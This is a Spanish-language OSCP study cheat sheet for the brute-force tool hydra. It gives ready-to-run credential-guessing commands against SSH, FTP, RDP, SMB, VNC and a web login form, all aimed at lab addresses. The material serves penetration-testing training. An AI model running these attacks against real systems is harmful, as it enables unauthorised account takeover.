`hydra` es una herramienta de fuerza bruta de autenticación que permite probar combinaciones de usuario y contraseña contra múltiples protocolos. Es una pieza clave en OSCP para comprobar credenciales en servicios como SSH, FTP, RDP, SMB, HTTP, VNC y más.

---

## Instalación

En Kali viene preinstalado. Si no:
```bash
sudo apt install hydra
```

---

## Uso Básico

```bash
hydra -l usuario -P rockyou.txt <protocolo>://<IP>
```

Ejemplo:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.11.1.23
```

---

## Opciones Principales

- `-l`: usuario
- `-L`: lista de usuarios
- `-p`: contraseña
- `-P`: lista de contraseñas
- `-s`: puerto (si no es el estándar)
- `-V`: modo verboso
- `-f`: salir tras el primer éxito

---

## Ejemplos por Servicio

### SSH
```bash
hydra -L users.txt -P pass.txt ssh://10.11.1.10
```

### FTP
```bash
hydra -l anonymous -p anonymous ftp://10.11.1.10
```

### RDP
```bash
hydra -L users.txt -P pass.txt rdp://10.11.1.10
```

### HTTP (formulario)
```bash
hydra -l admin -P rockyou.txt 10.11.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### SMB
```bash
hydra -L users.txt -P pass.txt smb://10.11.1.10
```

### VNC
```bash
hydra -P pass.txt -t 4 -V 10.11.1.10 vnc
```

---

## Resultados

Hydra mostrará las credenciales válidas en consola. Recomendado redirigir la salida:
```bash
hydra -L users.txt -P pass.txt ssh://10.11.1.10 -o resultados.txt
```

---

## Casos de Uso OSCP

- Probar credenciales por defecto o fugadas
- Automatizar ataques de fuerza bruta controlada
- Verificar reuse de contraseñas entre servicios

---

## Buenas Prácticas

- Nunca usar diccionarios grandes sin límite (`-f` o `-t`) en entornos sensibles
- Filtrar usuarios previamente con `smtp-user-enum`, `imapenum`, `rpcclient`, etc.
- Documentar todos los hallazgos y usar `-o` para guardarlos

---
